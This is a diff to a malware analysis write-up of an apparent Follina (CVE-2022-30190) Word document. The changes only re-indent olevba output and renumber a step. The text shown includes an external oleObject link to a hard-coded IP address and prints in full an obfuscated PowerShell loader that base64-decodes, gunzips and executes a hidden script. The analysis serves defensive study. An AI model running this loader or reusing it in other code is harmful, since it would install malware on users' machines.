@@ -40,16 +40,16 @@ olevba --decode word/_rels/document.xml.rels
         <Relationship Id="rId996" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="http://134.122.84.204/rtf-word-template.html" TargetMode="External"/>
         ...
         +----------+--------------------+---------------------------------------------+
-|Type      |Keyword             |Description                                  |
-+----------+--------------------+---------------------------------------------+
-|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
-|          |                    |used to obfuscate strings (option --decode to|
-|          |                    |see all)                                     |
-|IOC       |http://134.122.84.20|URL                                          |
-|          |4/rtf-word-         |                                             |
-|          |template.html       |                                             |
-|IOC       |134.122.84.204      |IPv4 address                                 |
-
+        |Type      |Keyword             |Description                                  |
+        +----------+--------------------+---------------------------------------------+
+        |Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+        |          |                    |used to obfuscate strings (option --decode to|
+        |          |                    |see all)                                     |
+        |IOC       |http://134.122.84.20|URL                                          |
+        |          |4/rtf-word-         |                                             |
+        |          |template.html       |                                             |
+        |IOC       |134.122.84.204      |IPv4 address                                 |
+        ...
 ```
 
 4.  
@@ -64,7 +64,7 @@ And it's a Deja-Vu, [CVE-2022-30190 Explained](https://ethical.blue/textz/n/32).
 ```
 &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIAA9iSGM{0}A5VVTW/jNh{0}9+1cMDLWREJtQvDm0AbKoq80WAbK7xiptDoaB0NQ4VkOTLknFNhL/95IS9eE4Qbs62BJn+Pj45{1}25KAQzuRTwB5rhHc4Zz1EY6D33wD7BhsElfMXN8Nv8b2QGhre7NX6lK7SDhtj8pMyvk8mfGj/h{1}hbcJ'+'AozG8kp1xYiMKrAJmui5HZHXmXY8c5Indvb9xY1xbXcoLJflh2U8QlVdBVW79PUqFw8zI'+'JErlZUZIPD0VRzJsWrwU9yI7ikWTkaeUwlGWoNXo{0}VzAqOjuBvYQRVSr6AsF4Ghv{1}P9Oe5yPpRGazmlXN5r{1}0KVHbyNN3Z9xVxqqWSPaLR5Jatb3zG7Nc4/nA8kWhDlXHr+pXLq{0}/RZSdvzBiujQW'+'syhFWVPbv0VX4hErjMeMGulPyt5{1}nE79Q/+zDOTkbjc{1}v52QUn/cHbiN+9V6loDYK6crRrd{0}JdVpajlmaLcGqQBU/Z5a+r0eHndY8rcHeIYisULnZkbRODf36{1}2BhXYW'+'D8Dm4teh7GFIN04M533ElDSaoTL7IGTX4F+V5Rp31Esr5nLLHWRS9QYeM{0}7N0vnWTxvo9aQJRcD7oG67PRn3PpwvX6NTusyvkdL4zOJ3NAvfvDBkTi2ufl5+e473XGkVWh8Opwa0hKJjMnNsvLsZpcn0dOf1/dzlh/87aVm40TFxjpUvk'+'HFQhhM0Gq06hrXX7cAoBiqcL9yVc45/aMVuoJsDkal2YN'+'n{1}vErneqfxhaSBMIvi'+'SMyW1XBhIpFpLVQpKYOwWc0kaFFrsJ8zI'+'vb{1}X3pReDnJnS4Nhu7FBPG{1}/yA2KB7Ps2'+'qhu6a6Rjnz0YypNT2dwYyGdLP44IA3PH+daz/os1RVlS8u5AoVcNMdNm9XSdk94cEpHpN5tdaDVSNHLtXiSjzi82q6tttrq3aDsu5baLHOOYRjkpeuqTXxHmoWVxwYQDyA4YB/BU{0}DER5JeOf0wu7Vavndh+DZ1KaTU+Mpr3qLYZqOOS{1}fNnxbl7mpRIci'+'jV9W0vemKebRvGNYHXwU++vjzGbzAt8IMK1Tw5jmAGkEpSA18{0}ieTFE7sf6n/jWSlhyMyoWbpo'+'h/'+'hpAXZOi'+'IBKiXVNJ4dLNZhXcYJ40hVGL3F4LL7YVtt2zs28P/ybwvzn47tGvbIr/Wcz7zQy+Yu9AePP9oTLjX6/ZTtWN9QXcO011Zq5Lq+q/yvdWZzzTe18/fVv8LuL+ys{0}AAA')-f'C','g')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
 ```
-1. The {base64payload} needs some work: concatenation, replace("{0}","C"), replace("{1}","g"), base64 decode then gunzip it. The result:
+5. The {base64payload} needs some work: concatenation, replace("{0}","C"), replace("{1}","g"), base64 decode then gunzip it. The result:
 ```
 function Get-Webclient 
 {
